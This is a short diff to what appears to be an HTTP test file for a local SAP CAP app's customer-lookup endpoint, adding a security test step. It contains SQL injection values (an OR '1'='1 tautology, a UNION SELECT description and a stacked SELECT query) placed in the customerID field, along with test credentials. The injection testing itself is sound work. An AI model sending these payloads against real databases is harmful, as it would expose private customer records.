@@ -25,3 +25,16 @@
   {
     "customerID": "1004100' OR '1'='1"
   }
+
+ ### Step 3: Test other common SQL injection payloads to ensure robustness
+ ### Action: Inject malicious payload 'UNION SELECT * FROM Customers --" }
+ ### Expected: Returns ALL customer records
+ ### Result: Full database exposure vulnerability
+
+  GET http://localhost:4004/odata/v4/admin/fetchCustomer
+  Content-Type: application/json
+  Authorization: Basic incident.support@tester.sap.com:initial
+
+{
+  "customerID": "1004100'; SELECT * from sap_capire_incidents_Customers;-- "
+}
